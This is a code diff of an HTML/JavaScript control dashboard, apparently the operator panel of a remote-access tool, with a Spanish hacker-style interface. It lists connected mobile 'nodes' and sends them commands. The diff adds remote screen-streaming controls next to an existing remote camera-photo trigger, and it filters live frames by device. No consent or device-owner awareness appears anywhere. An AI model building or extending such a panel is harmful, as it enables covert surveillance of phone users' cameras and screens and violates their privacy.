@@ -56,14 +56,14 @@
           <h2 class="text-sm font-bold text-[#00E5FF] tracking-wider">> NODOS MÓVILES</h2>
           <span id="deviceCount" class="text-xs bg-[#00E5FF]/20 text-[#00E5FF] px-2 py-1 rounded">0 ACTIVOS</span>
         </div>
-        <div id="devicesContainer" class="space-y-3 overflow-y-auto max-h-[250px] flex-grow pr-1 mb-4">
+        <div id="devicesContainer" class="space-y-3 overflow-y-auto max-h-[300px] flex-grow pr-1 mb-4">
           <div class="text-center py-8 text-gray-500 text-xs border border-dashed border-gray-800 rounded">
             [ ESCANEANDO RED... ]
           </div>
         </div>
         <div>
           <h3 class="text-xs font-bold text-gray-400 mb-2">> LOGS DE ACTIVIDAD</h3>
-          <div id="logConsole" class="bg-black/80 border border-gray-800 rounded p-2 h-32 overflow-y-auto text-[10px] text-green-400 font-mono">
+          <div id="logConsole" class="bg-black/80 border border-gray-800 rounded p-2 h-28 overflow-y-auto text-[10px] text-green-400 font-mono">
             [System] Interfaz cargada correctamente...<br />
           </div>
         </div>
@@ -71,13 +71,16 @@
 
       <!-- Columna 2: Transmisión de Pantalla en Vivo -->
       <section class="neon-border bg-[#0A0F1D]/80 p-4 rounded-lg flex flex-col">
-        <h2 class="text-sm font-bold text-[#00E5FF] tracking-wider border-b border-[#00E5FF]/30 pb-2 mb-4">
-          > TRANSMISIÓN DE PANTALLA
-        </h2>
+        <div class="flex justify-between items-center border-b border-[#00E5FF]/30 pb-2 mb-4">
+          <h2 class="text-sm font-bold text-[#00E5FF] tracking-wider">
+            > TRANSMISIÓN DE PANTALLA
+          </h2>
+          <span id="streamingTarget" class="text-[10px] text-yellow-400">[ Ningún nodo seleccionado ]</span>
+        </div>
         <div class="relative w-full h-[380px] bg-black border border-[#00E5FF]/40 rounded flex items-center justify-center overflow-hidden">
           <img id="screenStream" alt="Transmisión en vivo..." class="object-contain w-full h-full hidden" />
           <span id="screenPlaceholder" class="text-xs text-gray-500 text-center px-4">
-            [ ESPERANDO STREAM DE PANTALLA... ]
+            [ SELECCIONA UN NODO E INICIA STREAM ]
           </span>
         </div>
       </section>
@@ -114,6 +117,9 @@
       const screenStream = document.getElementById("screenStream");
       const screenPlaceholder = document.getElementById("screenPlaceholder");
       const logConsole = document.getElementById("logConsole");
+      const streamingTarget = document.getElementById("streamingTarget");
+
+      let activeStreamDevice = null; // Controla qué dispositivo estamos viendo en pantalla
 
       setInterval(() => {
         const now = new Date();
@@ -155,8 +161,16 @@
                 <div class="text-xs font-bold text-[#00E5FF]">${dev.name}</div>
                 <div class="text-[9px] text-gray-400 truncate">ID: ${dev.id}</div>
             </div>
-            <button onclick="triggerPhoto('${dev.id}')" class="bg-[#00E5FF] text-black text-[10px] font-bold py-1 px-2 rounded hover:bg-[#00b3cc] transition neon-glow-green text-center">
-                [ 📸 CAPTURAR FOTO ]
+            <div class="grid grid-cols-2 gap-1">
+                <button onclick="triggerPhoto('${dev.id}')" class="bg-[#00E5FF] text-black text-[9px] font-bold py-1 px-1 rounded hover:bg-[#00b3cc] transition text-center">
+                    📸 FOTO
+                </button>
+                <button onclick="startScreen('${dev.id}', '${dev.name}')" class="bg-[#00FF66] text-black text-[9px] font-bold py-1 px-1 rounded hover:bg-[#00cc52] transition text-center">
+                    📺 STREAM
+                </button>
+            </div>
+            <button onclick="stopScreen('${dev.id}')" class="bg-red-500/20 border border-red-500 text-red-400 text-[9px] font-bold py-1 px-1 rounded hover:bg-red-500 hover:text-black transition text-center">
+                ⏹️ DETENER STREAM
             </button>
           `;
           devicesContainer.appendChild(card);
@@ -165,10 +179,29 @@
 
       function triggerPhoto(socketId) {
         log(`Enviando 'get_photo' al nodo: ${socketId}`);
-        socket.emit("send_command_to_device", {
-          targetId: socketId,
-          action: "get_photo",
-        });
+        socket.emit("send_command_to_device", { targetId: socketId, action: "get_photo" });
+      }
+
+      function startScreen(socketId, deviceName) {
+        // Si ya había otro stream abierto, lo detenemos primero en el nodo anterior
+        if (activeStreamDevice && activeStreamDevice !== socketId) {
+          stopScreen(activeStreamDevice);
+        }
+        activeStreamDevice = socketId;
+        streamingTarget.innerText = `[ Visualizando: ${deviceName} ]`;
+        log(`Iniciando transmisión de pantalla para: ${deviceName}`);
+        socket.emit("send_command_to_device", { targetId: socketId, action: "start_screen" });
+      }
+
+      function stopScreen(socketId) {
+        log(`Deteniendo transmisión de pantalla para: ${socketId}`);
+        socket.emit("send_command_to_device", { targetId: socketId, action: "stop_screen" });
+        if (activeStreamDevice === socketId) {
+          activeStreamDevice = null;
+          streamingTarget.innerText = `[ Ningún nodo seleccionado ]`;
+          screenStream.classList.add("hidden");
+          screenPlaceholder.classList.remove("hidden");
+        }
       }
 
       // Recibir foto del celular
@@ -181,11 +214,13 @@
         }
       });
 
-      // Recibir frames de pantalla en vivo
-      socket.on("screen_frame", (base64Frame) => {
-        screenStream.src = `data:image/jpeg;base64,${base64Frame}`;
-        screenStream.classList.remove("hidden");
-        screenPlaceholder.classList.add("hidden");
+      // Recibir frames de pantalla en vivo filtrando solo los del dispositivo activo
+      socket.on("screen_frame", (data) => {
+        if (data.deviceId === activeStreamDevice) {
+          screenStream.src = `data:image/jpeg;base64,${data.frame}`;
+          screenStream.classList.remove("hidden");
+          screenPlaceholder.classList.add("hidden");
+        }
       });
     </script>
   </body>
